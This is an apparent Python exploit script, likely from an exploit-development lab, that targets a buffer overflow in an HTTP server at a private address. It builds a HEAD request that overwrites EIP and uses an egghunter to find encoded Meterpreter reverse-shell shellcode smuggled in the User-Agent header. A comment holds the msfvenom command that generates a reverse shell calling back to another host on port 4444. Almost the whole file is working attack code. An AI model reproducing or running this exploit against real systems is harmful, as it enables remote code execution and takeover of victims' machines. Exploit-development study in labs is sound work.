import socket
import os
import sys



'''
http://www.fuzzysecurity.com/tutorials/expDev/4.html

short jump = \xEB
back 60 bytes = \xC4 (use windows calc)

!mona help egg
!mona egg -t b33f

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.31.1.111 LPORT=4444 -f c -e x86/alpha_mixed

'''

# eip offset 515
#bad chars \x00\x0d\x0a\x3d\x20\x3f
# 0x7e48321c

eip = "\x1c\x32\x48\x7e"

egg=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

shellcode = (
"\x89\xe2\xdd\xc6\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x78\x68\x6c\x42\x43\x30\x55\x50\x67\x70\x33\x50\x6f"
"\x79\x68\x65\x74\x71\x59\x50\x63\x54\x6c\x4b\x30\x50\x30\x30"
"\x4e\x6b\x76\x32\x34\x4c\x4c\x4b\x70\x52\x66\x74\x6e\x6b\x31"
"\x62\x67\x58\x74\x4f\x78\x37\x32\x6a\x66\x46\x66\x51\x79\x6f"
"\x6e\x4c\x35\x6c\x65\x31\x61\x6c\x65\x52\x66\x4c\x67\x50\x4f"
"\x31\x48\x4f\x46\x6d\x76\x61\x4b\x77\x4a\x42\x39\x62\x66\x32"
"\x72\x77\x4e\x6b\x56\x32\x72\x30\x6c\x4b\x51\x5a\x37\x4c\x4c"
"\x4b\x50\x4c\x64\x51\x34\x38\x5a\x43\x52\x68\x35\x51\x5a\x71"
"\x63\x61\x6c\x4b\x72\x79\x75\x70\x67\x71\x68\x53\x6e\x6b\x62"
"\x69\x66\x78\x4d\x33\x54\x7a\x47\x39\x4c\x4b\x64\x74\x6e\x6b"
"\x73\x31\x68\x56\x35\x61\x6b\x4f\x6e\x4c\x59\x51\x7a\x6f\x44"
"\x4d\x45\x51\x48\x47\x74\x78\x6b\x50\x54\x35\x38\x76\x64\x43"
"\x51\x6d\x48\x78\x47\x4b\x71\x6d\x71\x34\x32\x55\x4a\x44\x73"
"\x68\x4e\x6b\x43\x68\x34\x64\x53\x31\x6a\x73\x61\x76\x4c\x4b"
"\x46\x6c\x72\x6b\x4c\x4b\x51\x48\x45\x4c\x67\x71\x68\x53\x4e"
"\x6b\x57\x74\x6c\x4b\x45\x51\x78\x50\x6f\x79\x42\x64\x71\x34"
"\x35\x74\x51\x4b\x33\x6b\x61\x71\x76\x39\x53\x6a\x66\x31\x6b"
"\x4f\x4d\x30\x71\x4f\x53\x6f\x30\x5a\x6e\x6b\x46\x72\x7a\x4b"
"\x4c\x4d\x33\x6d\x50\x68\x66\x53\x45\x62\x75\x50\x55\x50\x43"
"\x58\x73\x47\x72\x53\x55\x62\x61\x4f\x52\x74\x43\x58\x72\x6c"
"\x73\x47\x65\x76\x54\x47\x6b\x4f\x79\x45\x4e\x58\x4e\x70\x67"
"\x71\x67\x70\x43\x30\x67\x59\x4a\x64\x73\x64\x46\x30\x72\x48"
"\x47\x59\x6b\x30\x50\x6b\x63\x30\x59\x6f\x68\x55\x51\x7a\x75"
"\x55\x70\x68\x4c\x6c\x37\x6f\x77\x71\x42\x4f\x35\x38\x57\x72"
"\x77\x70\x66\x71\x51\x4c\x6d\x59\x6d\x36\x30\x50\x76\x30\x52"
"\x70\x32\x70\x67\x30\x66\x30\x63\x70\x42\x70\x63\x58\x59\x7a"
"\x74\x4f\x69\x4f\x59\x70\x4b\x4f\x6b\x65\x4f\x67\x33\x5a\x32"
"\x30\x72\x76\x61\x47\x51\x78\x4d\x49\x4d\x75\x30\x74\x61\x71"
"\x6b\x4f\x69\x45\x6e\x65\x49\x50\x54\x34\x46\x6a\x69\x6f\x62"
"\x6e\x33\x38\x42\x55\x4a\x4c\x78\x68\x31\x71\x37\x70\x65\x50"
"\x45\x50\x53\x5a\x45\x50\x51\x7a\x65\x54\x42\x76\x43\x67\x43"
"\x58\x47\x72\x78\x59\x68\x48\x63\x6f\x49\x6f\x59\x45\x4d\x53"
"\x49\x68\x65\x50\x33\x4e\x64\x76\x4e\x6b\x55\x66\x62\x4a\x33"
"\x70\x61\x78\x63\x30\x62\x30\x73\x30\x75\x50\x70\x56\x50\x6a"
"\x63\x30\x43\x58\x62\x78\x6e\x44\x73\x63\x6b\x55\x4b\x4f\x39"
"\x45\x4f\x63\x71\x43\x42\x4a\x75\x50\x31\x46\x62\x73\x71\x47"
"\x31\x78\x36\x62\x69\x49\x48\x48\x53\x6f\x49\x6f\x6e\x35\x4e"
"\x63\x78\x78\x43\x30\x61\x6d\x47\x52\x56\x38\x75\x38\x65\x50"
"\x43\x70\x37\x70\x67\x70\x51\x7a\x43\x30\x66\x30\x65\x38\x56"
"\x6b\x76\x4f\x76\x6f\x34\x70\x39\x6f\x5a\x75\x53\x67\x31\x78"
"\x52\x55\x62\x4e\x30\x4d\x55\x31\x49\x6f\x4e\x35\x53\x6e\x51"
"\x4e\x6b\x4f\x34\x4c\x36\x44\x7a\x49\x51\x61\x4b\x4f\x79\x6f"
"\x49\x6f\x63\x31\x4f\x33\x61\x39\x4a\x66\x61\x65\x6a\x67\x6f"
"\x33\x4f\x4b\x5a\x50\x58\x35\x49\x32\x63\x66\x72\x4a\x63\x30"
"\x61\x43\x6b\x4f\x59\x45\x41\x41")


Stage1 = "A"*478 + egg + "A"*5 + eip + "\xEB\xC4"
Stage2 = "b33fb33f" + shellcode

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 172.31.1.205:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con = soc.connect(("172.31.1.205",8080))
soc.send(buffer)
soc.close()

